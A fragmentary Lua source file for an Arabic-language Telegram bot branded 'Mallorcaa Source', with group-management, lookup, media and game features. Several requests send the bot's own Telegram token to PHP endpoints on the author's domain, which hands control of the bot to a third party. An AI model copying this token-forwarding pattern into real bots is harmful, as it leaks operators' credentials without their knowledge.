...
print("\27[34m"..[[>> Your bot has been activated on the Mallorcaa source]].."\27[m")
...
local NameUser = "[- Mallorcaa 𝖲𝗈𝗎𝗋𝖼𝖾 .](https://t.me/FBBBBB)\n — — — — — — — — —\n⌔︙بواسطه -› ["..data.first_name_.."](T.me/"..UserName..")"
local NameUserr = "[- Mallorcaa 𝖲𝗈𝗎𝗋𝖼𝖾 .](https://t.me/FBBBBB)\n — — — — — — — — —\n⌔︙اسم المستخدم -› ["..data.first_name_.."](T.me/"..UserName..")"
if status == "lock" then
...
send(msg.chat_id_, msg.id_,"[- Mallorcaa 𝖲𝗈𝗎𝗋𝖼𝖾 .](https://t.me/FBBBBB)\n — — — — — — — — —\n⌔︙العضو -› ["..data.first_name_.."](t.me/"..(data.username_ or "FBBBBB")..")".."\n⌔︙تم رفعه "..RTPA.." هنا\n")
...
local msg_id = msg.id_/2097152/0.5
local done = json:decode(https.request("https://Mallorcaa-source.tk/MallorcaaTeAM/searchinbot.php?token="..token.."&chat_id="..msg.chat_id_.."&from="..msg.sender_user_id_.."&msg="..msg_id.."&Text="..TextSearch.."&n=s")) 
end
end
...
zh = https.request('https://Mallorcaa-source.tk/MallorcaaTeAM/frills.php?en='..URL.escape(TextZhrfa)..'')
zx = JSON.decode(zh)
t = "\n⌔︙قائمه الزخرفه \n — — — — — — — — — \n"
i = 0
...
gk = https.request('https://Mallorcaa-source.tk/MallorcaaTeAM/Horoscopes.php?br='..URL.escape(Textbrj)..'')
br = JSON.decode(gk)
...
ge = https.request('https://Mallorcaa-source.tk/MallorcaaTeAM/Calculateage.php?age='..URL.escape(Textage)..'')
ag = JSON.decode(ge)
...
request = https.request('https://Mallorcaa-source.tk/MallorcaaTeAM/infoInstagram.php?username='..URL.escape(text:match("^معلومات (.*)$")))
...
data,res = https.request('https://Mallorcaa-source.tk/MallorcaaTeAM/movie.php?serch='..URL.escape(Textm)..'')
if res == 200 then
...
if text == "غنيلي" then
data,res = https.request('https://Mallorcaa-source.tk/MallorcaaTeAM/audios.php')
if res == 200 then
...
st = https.request('https://Mallorcaa-source.tk/MallorcaaTeAM/ImageInfo.php?token='..token..'&url='..sticker_id.."&type=sticker")
eker = JSON.decode(st)
...
Srrt = https.request('https://Mallorcaa-source.tk/MallorcaaTeAM/ImageInfo.php?token='..token..'&url='..photo_id.."&type=photo")
...
if DevMallorcaa(msg) then
local Get_Files, res = https.request("https://raw.githubusercontent.com/Mallorcaa/files_Mallorcaa/master/getfile.json")
if res == 200 then
...
local url,res = https.request('https://Mallorcaa-source.tk/MallorcaaTeAM/ChatMember.php?id='..msg.sender_user_id_)
data = JSON.decode(url)
...
{{text = '- 𝘊𝘢𝘭𝘭 𝘜𝘴 .',url="t.me/TwSLMallorcaaBot"}},
}
...
if database:get(bot_id.."MallorcaaBTSS:Set:Name:Bot"..msg.sender_user_id_) then 
if text == "الغاء" or text == "الغاء ⌔" then   
send(msg.chat_id_, msg.id_,"⌔︙ تم الغاء حفظ اسم البوت") 
database:del(bot_id.."MallorcaaBTSS:Set:Name:Bot"..msg.sender_user_id_) 
return false  
end 
database:del(bot_id.."MallorcaaBTSS:Set:Name:Bot"..msg.sender_user_id_) 
database:set(bot_id.."Mallorcaa:Name:Bot",text) 
...
database:setex(bot_id.."MallorcaaBTSS:Set:Name:Bot"..msg.sender_user_id_,300,true) 
send(msg.chat_id_, msg.id_,"⌔︙ ارسل لي الاسم الان ")  
end
...
thumb_url = 'https://Mallorcaa-source.tk/geam1.jpg'
},{
type = 'article',
id = math.random(1,64),
title = 'ورقه',
...
thumb_url = 'https://Mallorcaa-source.tk/geam2.jpg'	
},{
type = 'article',
id = math.random(1,64),
title = 'مقص',
...
thumb_url = 'https://Mallorcaa-source.tk/geam3.jpg'	
}
}
...
gk = https.request('https://Mallorcaa-source.tk/MallorcaaTeAM/Horoscopes.php?br='..URL.escape(OnID))
br = JSON.decode(gk)
x = {} 
x.inline_keyboard = {
{{text = '⌔︙ Mallorcaa 𝖲𝗈𝗎𝗋𝖼𝖾  .',url='http://t.me/fBBBBB'}},
}
...
inline = {
{{text = '⌔︙ Mallorcaa 𝖲𝗈𝗎𝗋𝖼??  .',url='http://t.me/fBBBBB'}},
}
https.request("https://api.telegram.org/bot"..token.."/deleteMessage?chat_id="..Chat_id.."&message_id="..msg_idd)
send_inlin_key(Chat_id,Text,inline)
...
object = https.request('https://Mallorcaa-source.tk/Api/InfoVid.php?url=http://www.youtube.com/watch?v='..URL.escape(id_from_vid))
...
InfoVid = https.request('https://Mallorcaa-source.tk/Api/BotYoutube.php?Id='..URL.escape(id_from_vid))
InfoVidend = JSON.decode(InfoVid)
if InfoVidend.Info.video == "not" then  
https.request("https://Mallorcaa-source.tk/MallorcaaTeAM/searchinbot.php?V="..URL.escape(id_from_vid).."&ch=do")
end
end
...
https.request("https://api.telegram.org/bot"..token.."/deleteMessage?chat_id="..Chat_id.."&message_id="..msg_idd)
https.request("https://Mallorcaa-source.tk/MallorcaaTeAM/searchinbot.php?token="..token.."&chat_id="..Chat_id.."&data="..URL.escape(DAata).."&n=do")
end
